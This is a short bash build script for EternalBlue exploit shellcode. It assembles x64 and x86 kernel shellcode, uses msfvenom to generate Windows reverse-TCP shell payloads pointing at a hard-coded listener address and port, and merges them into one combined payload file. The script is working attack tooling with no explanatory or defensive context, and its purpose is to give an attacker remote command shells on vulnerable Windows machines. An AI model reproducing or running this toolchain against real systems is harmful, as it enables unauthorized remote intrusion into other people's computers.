#!/bin/bash
set -e
cat << "EOF"
      __                                   ___    ____      
     /\ \__                               /\_ \  /\  _`\    
   __\ \ ,_\    __   _ __    ___      __  \//\ \ \ \ \L\ \  
 /'__`\ \ \/  /'__`\/\`'__\/' _ `\  /'__`\  \ \ \ \ \  _ <' 
/\  __/\ \ \_/\  __/\ \ \/ /\ \/\ \/\ \L\.\_ \_\ \_\ \ \L\ \
\ \____\\ \__\ \____\\ \_\ \ \_\ \_\ \__/.\_\/\____\\ \____/
 \/____/ \/__/\/____/ \/_/  \/_/\/_/\/__/\/_/\/____/ \/___/ 

EOF

echo Compiling x64 kernel shellcode...
nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin

echo Compiling x86 kernel shellcode...
nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin

targetIp="192.168.69.99" #$1
portx64="1234" #2
portx86="1234" #3

echo Generating x64 cmd shell...
msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$targetIp LPORT=$portx64

echo Generating x86 cmd shell...
msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$targetIp LPORT=$portx86

echo Merging shellcode...
cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
python3 eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin

echo DONE
exit 0
